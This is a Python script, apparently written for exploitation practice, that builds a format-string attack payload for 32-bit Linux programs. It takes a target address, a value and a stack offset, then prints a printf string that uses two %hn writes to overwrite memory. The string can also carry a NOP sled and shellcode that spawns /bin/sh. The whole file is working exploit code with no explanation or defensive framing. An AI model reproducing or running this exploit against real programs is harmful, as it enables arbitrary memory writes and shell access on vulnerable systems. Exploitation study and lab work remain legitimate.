#!/usr/bin/env python
import struct
import sys

def hexify(hexstr):
    hexstr=padder(hexstr)
    return  "\\x" + hexstr[6:8] + "\\x" + hexstr[4:6] + "\\x" + hexstr[2:4] + "\\x" + hexstr[0:2]
def hex2int(hexnum):
    return int(hexnum,16)
def int2hex(intnum):
    return hex(intnum)[2:]
def padder(string):
    delta = 8 - len(string)
    if(delta==0): 
        return string
    if(delta < 0):
        return string[-8:]
    else:
        if(delta > 0):
            return "0"*delta + string

#toWrite="fd2dbfff"
#where="08049760"
if(len(sys.argv) < 4):
    print("usage:\n What_to_write where_to_write offset [nop_sled]")
    exit()

toWrite=sys.argv[1]
where=sys.argv[2]
offset=int(sys.argv[3])
if(len(sys.argv)<5):
    sled_length=0
else:
    sled_length=int(sys.argv[4])

littleValue=hex2int(toWrite[0:4])
bigValue=hex2int(toWrite[4:8])
swap=True
if(bigValue<littleValue):
    tmp=bigValue
    bigValue=littleValue
    littleValue=tmp
    swap=False
output="printf '"
output+= str(hexify(where))
output+= str(hexify(int2hex(int(where,16)+2)))
output+="%%" + str(littleValue-8) + "c%%" + ( str(offset +1) if swap else str(offset) ) + "$hn"
output+="%%" + str(bigValue - littleValue) + "c%%" + ( str(offset) if swap else str(offset+1) ) + "$hn"
if(sled_length >0):
    output+= "\\x90" * sled_length
    output+="\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"
output+="'"
print(output)
